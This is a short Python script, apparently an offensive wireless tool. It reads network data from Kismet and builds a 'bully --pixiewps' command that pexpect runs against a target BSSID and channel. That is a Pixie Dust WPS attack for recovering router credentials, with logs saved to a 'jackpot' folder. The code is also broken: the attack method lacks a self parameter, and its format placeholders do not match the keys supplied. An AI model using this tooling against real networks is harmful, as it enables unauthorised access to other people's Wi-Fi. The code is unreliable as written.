"""" kismet data extract """

from config import Config
from kismet import Kismet
import pexpect
from datetime import datetime


class Quickman:
    def __init__(self, config):
        self.config = config
        self.kismet = Kismet(config)

    def wireless_data(self):
        """ main function """
        kismet = self.kismet
        resp = kismet.kismet_response()
        return resp.get('error') or list(kismet.network_data(resp['ok']))

    def pixie_attack(params):
        timestamp = datetime.now().strftime("%d%m%Y%H%M%S")
        p = [params['bssid'], timestamp]
        logname = "jackpot/bullylog-{0}-{1}.txt".format(*p)
        cmd = "bully -b {bssid} -c {channel} -o {logname} --pixiewps wlan1mon"
        command_params = {**params, 'log': logname}
        return cmd.format(**command_params)

    def running_attack(self, command):
        return pexpect.spawn(command)


if __name__ == "__main__":
    config = Config("config.yml")
    quickman = Quickman(config)

    print(quickman.wireless_data())
